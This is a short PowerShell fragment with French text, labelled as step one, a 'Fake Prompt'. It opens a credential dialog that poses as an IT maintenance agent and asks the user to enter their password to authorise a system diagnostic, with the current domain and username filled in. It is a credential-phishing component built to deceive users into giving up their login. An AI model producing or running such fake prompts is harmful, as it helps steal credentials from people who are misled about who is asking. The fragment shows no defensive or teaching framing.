# 1. Demande de mot de passe (Fake Prompt)
$caption = "Authentification Requise - Agent de Maintenance IT";
$message = "Veuillez saisir vos identifiants pour autoriser le diagnostic du système.";
$credential = $host.ui.PromptForCredential($caption, $message, "$env:userdomain\$env:username", "");
